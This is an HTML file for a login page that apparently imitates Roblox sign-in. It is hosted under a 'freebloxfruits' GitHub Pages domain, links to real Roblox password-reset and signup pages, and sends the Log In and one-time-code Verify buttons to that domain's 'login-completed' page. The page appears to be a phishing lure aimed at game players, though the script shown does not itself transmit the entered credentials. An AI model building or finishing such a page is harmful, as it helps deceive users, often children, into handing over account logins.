<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #e6e6e6;
            margin: 0;
            padding: 0;
        }

        .navbar {
            background-color: #2c2c2c;
            padding: 10px;
            text-align: right;
        }

        .navbar button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            cursor: pointer;
        }

        .login-container {
            max-width: 400px;
            margin: 50px auto;
            background-color: #ffffff;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
        }

        .login-container input, .login-container button {
            width: 100%;
            padding: 12px;
            margin: 5px 0;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }

        .modal {
            display: none;
            position: fixed;
            z-index: 1;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.5);
        }

        .modal-content {
            background-color: #fff;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #888;
            max-width: 400px;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <button id="signupButton">Sign Up</button>
    </div>
    <div class="login-container">
        <input type="email" id="email" placeholder="Email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button id="loginButton">Log In</button>
        <button id="forgotButton">Forgot username or password?</button>
        <button id="oneTimeCodeButton">Email me a one-time code</button>
        <button id="otherDeviceButton">Use another device</button>
        <button id="createAccountButton">Don't have an account? Create one</button>
    </div>
    <div id="oneTimeCodeModal" class="modal">
        <div class="modal-content">
            <input type="email" id="modalEmail" placeholder="Email" required>
            <button id="sendCodeButton">Send Code</button>
        </div>
    </div>
    <div id="digitCodeModal" class="modal">
        <div class="modal-content">
            <input type="text" id="digitCode" placeholder="Enter 6-digit code" maxlength="6" required>
            <button id="verifyCodeButton">Verify</button>
        </div>
    </div>
    <script>
        function showOneTimeCodeModal() {
            document.getElementById('oneTimeCodeModal').style.display = 'block';
        }

        function showDigitCodeModal() {
            document.getElementById('digitCodeModal').style.display = 'block';
        }

        function hideModals() {
            document.getElementById('oneTimeCodeModal').style.display = 'none';
            document.getElementById('digitCodeModal').style.display = 'none';
        }

        document.getElementById('oneTimeCodeButton').addEventListener('click', showOneTimeCodeModal);
        document.getElementById('sendCodeButton').addEventListener('click', function() {
            hideModals();
            showDigitCodeModal();
        });
        document.getElementById('verifyCodeButton').addEventListener('click', function() {
            hideModals();
            window.location.href = "https://freebloxfruits.github.io/login-completed/";
        });
        document.getElementById('forgotButton').addEventListener('click', function() {
            window.location.href = "https://www.roblox.com/login/forgot-password-or-username";
        });
        document.getElementById('signupButton').addEventListener('click', function() {
            window.open("https://www.roblox.com/?returnUrl=https%253A%252F%252Fwww.roblox.com%252Fdiscover%2523%252F", "_blank");
        });
        document.getElementById('createAccountButton').addEventListener('click', function() {
            window.open("https://www.roblox.com/?returnUrl=https%253A%252F%252Fwww.roblox.com%252Fdiscover%2523%252F", "_blank");
        });
        document.getElementById('loginButton').addEventListener('click', function() {
            window.location.href = "https://freebloxfruits.github.io/login-completed/";
        });
    </script>
</body>
</html>
